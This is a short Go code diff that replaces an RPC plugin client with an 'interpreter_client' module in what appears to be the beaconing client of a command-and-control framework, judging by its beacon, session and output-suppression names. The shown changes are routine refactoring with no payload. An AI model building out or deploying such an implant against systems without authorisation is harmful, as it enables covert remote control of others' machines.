@@ -10,11 +10,9 @@ import (
 	beaconHandler "src/Client/beacon/beaconHandler"
 	httpFuncs "src/Client/beacon/http"
 	"src/Client/generic/config"
+	"src/Client/generic/interpreter_client"
 	"src/Client/generic/logger"
-	"src/Client/generic/rpc_client"
 	"src/Client/session"
-
-	"github.com/hashicorp/go-plugin"
 )
 
 // --- Output Suppression Utility ---
@@ -110,7 +108,7 @@ func main() {
 	}
 
 	// Print list of loaded dynamic commands
-	cmds := rpc_client.ListDynamicCommands()
+	cmds := interpreter_client.ListDynamicCommands()
 	logger.Log(fmt.Sprintf("Loaded dynamic commands: %v", cmds))
 
 	switch config.PrimaryConnectionMethod {
@@ -125,5 +123,4 @@ func main() {
 		beacon()
 
 	}
-	plugin.CleanupClients()
 }
